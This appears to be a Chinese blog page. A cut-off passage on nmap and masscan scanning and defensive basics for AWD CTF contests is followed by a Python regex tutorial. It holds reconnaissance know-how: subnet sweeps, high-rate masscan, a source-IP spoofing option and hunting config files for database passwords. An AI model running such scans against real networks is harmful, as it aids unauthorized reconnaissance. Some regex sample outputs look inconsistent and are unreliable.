<p>-A  是用几个命令：OS 探测，版本探测，脚本扫描，traceroute</p>
<p>–reason 列出nmap的判断：端口开放，关闭，被过滤。</p>
<h4 id="输出格式"><a href="#输出格式" class="headerlink" title="输出格式"></a>输出格式</h4><p>-oN  标准输出</p>
<p>-oG  好理解的格式</p>
<p>-ox  xml格式</p>
<p>-oA&lt;basename&gt;  用&lt;basename&gt;生成以上格式的文件 </p>
<h3 id="线下AWD必须用好的nmap指令"><a href="#线下AWD必须用好的nmap指令" class="headerlink" title="线下AWD必须用好的nmap指令"></a>线下AWD必须用好的nmap指令</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">1.9 使用nmap扫描主机</span><br><span class="line">//  http://nmap.org/book/</span><br><span class="line">#nmap --version  // -V -h</span><br><span class="line">#man nmap	</span><br><span class="line"></span><br><span class="line">#nmap -vv 	-vv参数设置对结果的详细输出</span><br><span class="line">#nmap -sS -Pn -A host	隐身、操作系统信息和路由跟踪、-P0和-Pn两个选项的效果是一样的，就是不进行主机发现，而直接进行更深层次的扫描，如服务版本扫描或系统类型扫描。-Pn  不探测扫描（假定所有主机都存活）</span><br><span class="line"></span><br><span class="line">#nmap -A -T4 scanme.nmap.org</span><br><span class="line">// -A:to enable OS and version detection, script scanning,and traceroute;</span><br><span class="line">// -T4:faster execution加快执行速度</span><br><span class="line"></span><br><span class="line">#nmap localhost</span><br><span class="line">// #netstat -apn | grep 8080 ===&gt; port 8080 process</span><br><span class="line"></span><br><span class="line">*多机快速扫描</span><br><span class="line">#nmap -vv -sP 192.168.102.1-254	-sP是使用ICMP协议发送echo请求数据包，但是很容易被防火墙过滤掉。</span><br><span class="line"></span><br><span class="line">// ==&gt;在线主机</span><br><span class="line">#nmap -vv -sP 192.168.102.1-254 | grep &apos;report for.*[0-9]$&apos;</span><br><span class="line">#nmap -v -n -sP --max-rtt-timeout 500ms 192.168.102.1-254</span><br><span class="line"></span><br><span class="line">// ==&gt;在线主机:端口开放  -n 禁止反向IP地址查找</span><br><span class="line">#nmap -v -n -sS -Pn -p22 --max-rtt-timeout 500ms 192.168.102.1-254 | grep &apos;open&apos;</span><br><span class="line">#nmap -v -n -sS -Pn -p21，22，80，8080，3306 --max-rtt-timeout 500ms 192.168.102.1-254 | grep &apos;open&apos;</span><br><span class="line">#nmap -v -n -sS -Pn -p1-1024 --max-rtt-timeout 500ms 192.168.102.1-254 | grep &apos;open&apos;</span><br><span class="line">--max-rtt-timeout调整探测报文超时</span><br><span class="line"></span><br><span class="line">&gt; results.txt	重定向发送到文件</span><br></pre></td></tr></table></figure>

<h3 id="番外AWD"><a href="#番外AWD" class="headerlink" title="番外AWD"></a>番外AWD</h3><p>附上AWD基操</p>
<h4 id="1、确定环境是密码登录还是密钥登录"><a href="#1、确定环境是密码登录还是密钥登录" class="headerlink" title="1、确定环境是密码登录还是密钥登录"></a>1、确定环境是密码登录还是密钥登录</h4><p>密钥登录：（比赛方会提供如下三个文件）</p>
<p>id_rsa</p>
<p>id_rsa.pub</p>
<p>token.txt</p>
<p>文件导入即可</p>
<p>若为密码登录，则看密码是否为随机的哈希值，并推测全场密码是否一样，若一样则首先需要修改密码，避免对方写批量遍历脚本，遍历所有服务器，当可以登录时，就瞬间修改你的机子，然后你就什么都做不了，服务器都落到对方手中，除非重置机子。</p>
<p>修改密码：passwd 用户名    //linux命令</p>
<p>​                    passwd ubuntu sudo passwd root   //ubuntu命令： </p>
<p>​                    w   //查看当前登录的用户 </p>
<p>​                    kill -kill -t 用户的tty   //踢掉当前登录的用户</p>
<h4 id="2、迅速备份源码和数据库到本机"><a href="#2、迅速备份源码和数据库到本机" class="headerlink" title="2、迅速备份源码和数据库到本机"></a>2、迅速备份源码和数据库到本机</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">//这里假定web目录为/var/www/html</span><br><span class="line">mkdir -p ~/beifen</span><br><span class="line">cp -ra /var/www/html/. ~/beifen</span><br><span class="line">其中~代表用户的家目录，-r是递归，-a是保留原来文件属性， .是代表所有文件（不用*，因为*无法表示所有文件）</span><br></pre></td></tr></table></figure>

<p>定时备份源码：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="keyword">while</span> [ 1 ]</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">time=`/bin/date +%H-%M-%S`</span><br><span class="line">bak_file=<span class="string">"/var/www/<span class="variable">$time</span>.tar.gz"</span></span><br><span class="line">webdir=<span class="string">"/var/www/html"</span></span><br><span class="line">tar zcvf <span class="variable">$bak_file</span> <span class="variable">$webdir</span> &gt;/dev/null 2&gt;&amp;1 &amp;</span><br><span class="line">sleep 60                               //一分钟备份一次</span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure>

<h4 id="3、找配置文件-amp-mysql一些操作"><a href="#3、找配置文件-amp-mysql一些操作" class="headerlink" title="3、找配置文件&amp;mysql一些操作"></a>3、找配置文件&amp;mysql一些操作</h4><p>找配置文件，找文件名有con、config、db字样的。在刚才备份的文件那里可以使用linux命令</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find . -name &apos;*name*&apos;</span><br></pre></td></tr></table></figure>

<p>找到这些文件后，最主要找一些账号密码，例如mysql账号密码，如果找到了，自己可以修改自己服务器上的mysql密码，命令如下：（先自己登陆进去）</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; use mysql;</span><br><span class="line">mysql&gt; update user set password=PASSWORD(&quot;新的密码&quot;) where user=&apos;root&apos;; </span><br><span class="line">mysql&gt; flush privileges; (刷新)</span><br><span class="line">mysql&gt; exit</span><br></pre></td></tr></table></figure>

<p>记得修改了mysql密码后，还要把刚才找到的配置文件的密码给修改了，不然你的web服务就会不正常。</p>
<p>得到mysql密码，一般来说你就可以看看你自己mysql数据库里的数据，一般来说别人的数据库记录也是如此，所以别人一些后台账号密码，你都可以找到的（如果里面入库是不经过哈希处理的）</p>
<p>另外，也多注意有什么别的配置文件。</p>
<p>备份数据库</p>
<p>​        </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">//mysql备份指定数据库 </span><br><span class="line">mysqldump -u 用户名 -p 密码 数据库名 &gt; back.sql </span><br><span class="line">//mysql备份所有数据库 </span><br><span class="line">mysqldump --all-databases &gt; bak.sql </span><br><span class="line">//还原mysql数据库 </span><br><span class="line">mysql -u 用户名 -p 密码 数据库名 &lt; bak.sql</span><br></pre></td></tr></table></figure>

<h4 id="4、嗅探主机（nmap）"><a href="#4、嗅探主机（nmap）" class="headerlink" title="4、嗅探主机（nmap）"></a>4、嗅探主机（nmap）</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ICMP扫描： nmap -sP 192.168.150.0/24</span><br><span class="line">检测目标操作系统： -O</span><br><span class="line">SYN扫描  ： -sS</span><br><span class="line">操作系统版本检测： -sV</span><br><span class="line">nmap -sS -p 1337 192.168.150.0/24</span><br></pre></td></tr></table></figure>

<h4 id="5、嗅探主机-MASSCAN"><a href="#5、嗅探主机-MASSCAN" class="headerlink" title="5、嗅探主机(MASSCAN)"></a>5、嗅探主机(MASSCAN)</h4><p><strong>安装</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ sudo apt-get install clang git gcc make libpcap-dev</span><br><span class="line">$ git clone https://github.com/robertdavidgraham/masscan</span><br><span class="line">$ cd masscan</span><br><span class="line">$ make</span><br></pre></td></tr></table></figure>

<p><strong>单端口扫描</strong></p>
<p>扫描443端口的B类子网</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ Masscan 10.11.0.0/16 -p443</span><br></pre></td></tr></table></figure>

<p><strong>多端口扫描</strong></p>
<p>扫描80或443端口的B类子网</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ Masscan 10.11.0.0/16 -p80,443</span><br></pre></td></tr></table></figure>

<p><strong>扫描一系列端口</strong></p>
<p>扫描22到25端口的B类子网</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ Masscan 10.11.0.0/16 -p22-25</span><br></pre></td></tr></table></figure>

<p><strong>快速扫描</strong></p>
<p>使用如上的的设置可以得到结果，但速度将是比较慢。正如已经讨论的那样，整体上masscan要快一点，所以让我们加快速度。</p>
<p>默认情况下，Masscan扫描速度为每秒100个数据包，这是相当慢的。为了增加这一点，只需提供该-rate选项并指定一个值。</p>
<p>扫描100个常见端口的B类子网，每秒100,000个数据包</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ Masscan 10.11.0.0/16  --top-ports 100 -rate 100000</span><br></pre></td></tr></table></figure>

<p>你可以扫描的速度取决于很多因素，包括您的操作系统（Linux扫描扫描远远快于Windows），系统的资源，最重要的是您的带宽。为了以高速扫描非常大的网络，您需要使用百万以上的速率（-rate 1000000）。</p>
<p><strong>排除目标</strong></p>
<p>因为大部分的互联网可以很好地进行扫描，也可能只是出于纯粹的礼貌 – 你可能想要或需要从扫描中排除一些目标。为此，请提供–excludefile交换机以及包含要避免的范围列表的文件的名称。</p>
<p>扫描B类子网，但避免在exclude.txt中的</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ Masscan 10.11.0.0/16  --top-ports 100 --excludefile exclude.txt</span><br></pre></td></tr></table></figure>

<p><strong>结果保存</strong></p>
<p>您可以使用标准的Unix重定向器将输出发送到文件：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ Masscan 10.11.0.0/16  --top-ports 100 &gt; results.txt</span><br></pre></td></tr></table></figure>

<p> 除此之外，您还具有以下输出选项：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">-oX filename：输出到filename的XML。</span><br><span class="line">-oG filename：输出到filename的grepable格式。</span><br><span class="line">-oJ filename：输出到filename的JSON格式。</span><br></pre></td></tr></table></figure>

<p><strong>Nmap功能</strong></p>
<p>正如最初提到的，Masscan可以像nmap许多安全人员一样工作。这里有一些其他类似nmap的选项：</p>
<p>通过传递–nmap开关可以看到类似nmap的功能。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">1. -iL filename：从文件读取输入。</span><br><span class="line">2. ‐‐exclude host：在命令行中排除网络。</span><br><span class="line">3. ‐‐excludefile filename：从文件中排除网络。</span><br><span class="line">4. -S：欺骗源IP。</span><br><span class="line">5. -v interface：详细输出。</span><br><span class="line">6. -vv interface：非常冗长的输出。</span><br><span class="line">7. -e interface：使用指定的接口。</span><br><span class="line">8. -e interface：使用指定的接口。</span><br></pre></td></tr></table></figure>

<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><hr>
<p><a href="https://www.cnblogs.com/machangwei-8/p/10353004.html" target="_blank" rel="noopener">https://www.cnblogs.com/machangwei-8/p/10353004.html</a></p>
<p><a href="https://www.cnblogs.com/zhaijiahui/p/8367327.html" target="_blank" rel="noopener">https://www.cnblogs.com/zhaijiahui/p/8367327.html</a></p>
<p><a href="https://www.cnblogs.com/xdjun/p/9562030.html" target="_blank" rel="noopener">https://www.cnblogs.com/xdjun/p/9562030.html</a></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/07/21/python 正则/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="V">
      <meta itemprop="description" content>
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="V's blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/07/21/python 正则/" itemprop="url">python 正则</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-07-21T22:30:35+08:00">
                2019-07-21
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="python-正则"><a href="#python-正则" class="headerlink" title="python 正则"></a>python 正则</h1><h2 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h2><p>之前打CTF经常性的因为不会写脚本而去手撸，这大大降低了效率，而且有的题由于时间限制，显然手撸行不通。</p>
<p>而不会写脚本经常是因为自己不会处理得到的数据，如何过滤、拼接。所以今天学习一下python的re模块，正则替换，以及刚刚从Li4n0学长脚本中发现的字符表替换。</p>
<h3 id="正则"><a href="#正则" class="headerlink" title="正则"></a>正则</h3><h4 id="元字符"><a href="#元字符" class="headerlink" title="^元字符"></a>^元字符</h4><p>字符串开始位置与匹配规则符合就匹配，否则不匹配</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; import re</span><br><span class="line">&gt;&gt;&gt; result = re.findall(&quot;^匹配规则&quot;,&quot;匹配规则这个字符串是否匹配&quot;)</span><br><span class="line">&gt;&gt;&gt; print(result)</span><br><span class="line">[&apos;匹配规则&apos;]</span><br><span class="line">&gt;&gt;&gt; result = re.findall(&quot;^匹配规则&quot;,&quot;匹配s规则这个字符串是否匹配&quot;)</span><br><span class="line">&gt;&gt;&gt; print(result)</span><br><span class="line">[]</span><br></pre></td></tr></table></figure>

<p>[^a-z]反取，</p>
<p>匹配出除字母外的字符，^元字符如果写到字符集里就是反取</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; import re   #第一步，要引入re模块</span><br><span class="line">&gt;&gt;&gt; result = re.findall(&quot;[^a-z]&quot;, &quot;匹配s规则这s个字符串是否s匹配f规则则re则则则&quot;)   #反取，匹配出除字母外的字符</span><br><span class="line">&gt;&gt;&gt; print(result)  #以列表形式返回匹配到的字符串</span><br><span class="line">[&apos;匹&apos;, &apos;配&apos;, &apos;规&apos;, &apos;则&apos;, &apos;这&apos;, &apos;个&apos;, &apos;字&apos;, &apos;符&apos;, &apos;串&apos;, &apos;是&apos;, &apos;否&apos;, &apos;匹&apos;, &apos;配&apos;, &apos;规&apos;, &apos;则&apos;, &apos;则&apos;, &apos;则&apos;, &apos;则&apos;, &apos;则&apos;]</span><br></pre></td></tr></table></figure>

<h4 id="元字符-1"><a href="#元字符-1" class="headerlink" title="$元字符"></a>$元字符</h4><p>字符串结束位置与匹配规则符合就匹配，否则不匹配</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt;import re   #第一步，要引入re模块</span><br><span class="line">&gt;&gt;&gt;a = re.findall(&quot;匹配规则$&quot;, &quot;这个字符串是否匹配规则&quot;)   #字符串结束位置与匹配规则符合就匹配，否则不匹配</span><br><span class="line">&gt;&gt;&gt;print(a)  #以列表形式返回匹配到的字符串</span><br><span class="line">[&apos;匹配规则&apos;]</span><br></pre></td></tr></table></figure>

<h4 id="元字符-2"><a href="#元字符-2" class="headerlink" title="*元字符"></a>*元字符</h4><p>需要字符串里完全符合，匹配规则，就匹配，（规则里的*元字符）前面的一个字符可以是0个或多个原本字符</p>
<p>匹配前一个字符0或多次，贪婪匹配前导字符有多少个就匹配多少个很贪婪</p>
<p>如果规则里只有一个分组，尽量避免用*否则会有可能匹配出空字符串</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; import re</span><br><span class="line">&gt;&gt;&gt; result = re.findall(&quot;匹配规则*&quot;,&quot;这个字符串是否匹配规则则则则则&quot;)</span><br><span class="line">&gt;&gt;&gt; print(result)</span><br><span class="line">[&apos;匹配规则则则则则&apos;]</span><br><span class="line">&gt;&gt;&gt; result = re.findall(&quot;匹配规则*&quot;,&quot;这个字符串是否匹配规&quot;)</span><br><span class="line">&gt;&gt;&gt; print(result)</span><br><span class="line">[&apos;匹配规&apos;]</span><br><span class="line">&gt;&gt;&gt; result = re.findall(&quot;匹配规则*&quot;,&quot;whether this string is matching?&quot;)</span><br><span class="line">&gt;&gt;&gt; print(result)</span><br><span class="line">[]</span><br></pre></td></tr></table></figure>

<h4 id="元字符-3"><a href="#元字符-3" class="headerlink" title="+元字符"></a>+元字符</h4><p>需要字符串里完全符合，匹配规则，就匹配，（规则里的+元字符）前面的一个字符可以是1个或多个原本字符</p>
<p>匹配前一个字符1次或无限次，贪婪匹配前导字符有多少个就匹配多少个很贪婪</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; import re   #第一步，要引入re模块</span><br><span class="line">&gt;&gt;&gt; result = re.findall(&quot;匹配+&quot;, &quot;匹配配配配配规则这个字符串是否匹配规则则则则则&quot;)   #需要字符串里完全符合，匹配规则，就匹配，（规则里的+元字符）前面的一个字符可以是1个或多个原本字符</span><br><span class="line">&gt;&gt;&gt; print(result)  #以列表形式返回匹配到的字符串</span><br><span class="line">[&apos;匹配配配配配&apos;, &apos;匹配&apos;]</span><br></pre></td></tr></table></figure>

<h4 id="元字符，和防止贪婪匹配"><a href="#元字符，和防止贪婪匹配" class="headerlink" title="?元字符，和防止贪婪匹配"></a>?元字符，和防止贪婪匹配</h4><p>需要字符串里完全符合，匹配规则，就匹配，（规则里的?元字符）前面的一个字符可以是0个或1个原本字符</p>
<p>匹配一个字符0次或1次</p>
<p>还有一个功能是可以防止贪婪匹配，详情见防贪婪匹配</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; import re   #第一步，要引入re模块</span><br><span class="line">&gt;&gt;&gt; result = re.findall(&quot;匹配规则?&quot;, &quot;匹配规这个字符串是否匹配规则则则则则&quot;)   #需要字符串里完全符合，匹配规则，就匹配，（规则里的?元字符）前面的一个字符可以是0个或1个原本字符</span><br><span class="line">&gt;&gt;&gt; print(result)  #以列表形式返回匹配到的字符串</span><br><span class="line">[&apos;匹配规&apos;, &apos;匹配规则&apos;]</span><br></pre></td></tr></table></figure>

<h4 id><a href="#" class="headerlink" title=".*?"></a>.*?</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; line = &apos;my title=&quot;sw engineer&quot;. His is &quot;hello world&quot;&apos;</span><br><span class="line">&gt;&gt;&gt; m = re.search(r&apos;title=&quot;(.*?)&quot;&apos;, line)</span><br><span class="line">&gt;&gt;&gt; print m.group(1)</span><br><span class="line">sw engineer</span><br><span class="line"> </span><br><span class="line"># 如果没有 ?， 则会抓到最长的两个双引号之间的内容</span><br><span class="line">&gt;&gt;&gt; m = re.search(r&apos;title=&quot;(.*)&quot;&apos;, line)</span><br><span class="line">&gt;&gt;&gt; print m.group(1)</span><br><span class="line">sw engineer&quot;. His is &quot;hello world</span><br></pre></td></tr></table></figure>



<h4 id="元字符-范围"><a href="#元字符-范围" class="headerlink" title="{}元字符,范围"></a>{}元字符,范围</h4><p>需要字符串里完全符合，匹配规则，就匹配，（规则里的 {} 元字符）前面的一个字符，是自定义字符数，位数的原本字符</p>
<p>{m}匹配前一个字符m次，{m,n}匹配前一个字符m至n次，若省略n，则匹配m至无限次</p>
<p>{0,}匹配前一个字符0或多次,等同于*元字符<br>{+,}匹配前一个字符1次或无限次,等同于+元字符<br>{0,1}匹配前一个字符0次或1次,等同于?元字符</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt;import re   #第一步，要引入re模块</span><br><span class="line">&gt;&gt;&gt;result = re.findall(&quot;匹配规则&#123;3&#125;&quot;, &quot;匹配规则这个字符串是否匹配规则则则则则&quot;)   #&#123;m&#125;匹配前一个字符m次，&#123;m,n&#125;匹配前一个字符m至n次，若省略n，则匹配m至无限次</span><br><span class="line">&gt;&gt;&gt;print(result)  #以列表形式返回匹配到的字符串</span><br><span class="line">打印出 [&apos;匹配规则则则&apos;]</span><br></pre></td></tr></table></figure>

<h3 id="元字符-字符集"><a href="#元字符-字符集" class="headerlink" title="[]元字符,字符集"></a>[]元字符,字符集</h3><p>需要字符串里完全符合，匹配规则，就匹配，（规则里的 [] 元字符）对应位置是[]里的任意一个字符就匹配</p>
<p>字符集。对应的位置可以是字符集中任意字符。字符集中的字符可以逐个列出，也可以给出范围，如[abc]或[a-c]。[^abc]表示取反，即非abc。所有特殊字符在字符集中都失去其原有的特殊含义。用\反斜杠转义 <strong>恢复</strong> 特殊字符的特殊含义。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; import re   #第一步，要引入re模块</span><br><span class="line">&gt;&gt;&gt; result = re.findall(&quot;匹配[a,b,c]规则&quot;, &quot;匹配a规则这个字符串是否匹配b规则则则则则&quot;)   #需要字符串里完全符合，匹配规则，就匹配，（规则里的 [] 元字符）对应位置是[]里的任意一个字符就匹配</span><br><span class="line">&gt;&gt;&gt; print(result)  #以列表形式返回匹配到的字符串</span><br><span class="line">[&apos;匹配a规则&apos;, &apos;匹配b规则&apos;]</span><br><span class="line">&gt;&gt;&gt; result = re.findall(&quot;匹配[a,b,c]规则\t&quot;, &quot;匹配a规则	这个字符串是否匹配b规则则则则则&quot;)</span><br><span class="line">&gt;&gt;&gt; print(result)</span><br><span class="line">[&apos;匹配a规则\t&apos;]</span><br></pre></td></tr></table></figure>

<h4 id="反斜杠后边跟普通字符实现特殊功能；（即预定义字符）"><a href="#反斜杠后边跟普通字符实现特殊功能；（即预定义字符）" class="headerlink" title="反斜杠后边跟普通字符实现特殊功能；（即预定义字符）"></a>反斜杠后边跟普通字符实现特殊功能；（即预定义字符）</h4><p>预定义字符是在字符集和组里都是有用的</p>
<p>\d匹配任何十进制数，它相当于类[0-9]</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; import re   #第一步，要引入re模块</span><br><span class="line">&gt;&gt;&gt; result = re.findall(&quot;\d&quot;, &quot;匹配规则这2个字符串33是否匹配规则5则则则7则&quot;)   #\d匹配任何十进制数，它相当于类[0-9]</span><br><span class="line">&gt;&gt;&gt; print(result)  #以列表形式返回匹配到的字符串</span><br><span class="line">[&apos;2&apos;, &apos;3&apos;, &apos;3&apos;, &apos;5&apos;, &apos;7&apos;]</span><br></pre></td></tr></table></figure>

<p>\d+如果需要匹配一位或者多位数的数字时用</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; import re   #第一步，要引入re模块</span><br><span class="line">&gt;&gt;&gt; result = re.findall(&quot;\d&quot;, &quot;匹配规则这2个字符串33是否匹配规则5则则则7则&quot;)   #\d匹配任何十进制数，它相当于类[0-9]</span><br><span class="line">&gt;&gt;&gt; print(result)  #以列表形式返回匹配到的字符串</span><br><span class="line">[&apos;2&apos;, &apos;33&apos;,  &apos;5&apos;, &apos;7&apos;]</span><br></pre></td></tr></table></figure>

<p>\D匹配任何非数字字符，它相当于类[^0-9]</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; import re   #第一步，要引入re模块</span><br><span class="line">&gt;&gt;&gt; result = re.findall(&quot;\D&quot;, &quot;匹配规则这2个字符串33是否匹配规则5则则则7则&quot;)   #\D匹配任何非十进制数，它相当于类[^0-9]</span><br><span class="line">&gt;&gt;&gt; print(result)  #以列表形式返回匹配到的字符串</span><br><span class="line">[&apos;匹&apos;, &apos;配&apos;, &apos;规&apos;, &apos;则&apos;, &apos;这&apos;, &apos;个&apos;, &apos;字&apos;, &apos;符&apos;, &apos;串&apos;, &apos;是&apos;, &apos;否&apos;, &apos;匹&apos;, &apos;配&apos;, &apos;规&apos;, &apos;则&apos;, &apos;则&apos;, &apos;则&apos;, &apos;则&apos;, &apos;则&apos;]</span><br></pre></td></tr></table></figure>

<p>\s匹配任何空白字符，它相当于类[\t\n\r\f\v]</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; import re   #第一步，要引入re模块</span><br><span class="line">&gt;&gt;&gt; result = re.findall(&quot;\s&quot;, &quot;匹配规则   这2个字符串3是否匹\n配规则5则则则7则&quot;)   #\s匹配任何空白字符，它相当于类[\t\n\r\f\v]	(横向制表符、换行、回车、换页、纵向制表符)</span><br><span class="line">&gt;&gt;&gt; print(result)  #以列表形式返回匹配到的字符串</span><br><span class="line">[&apos;\t&apos;, &apos; &apos;, &apos; &apos;, &apos;\n&apos;]</span><br></pre></td></tr></table></figure>

<p>\S匹配任何非空白字符，它相当于类[^\t\n\r\f\v]</p>
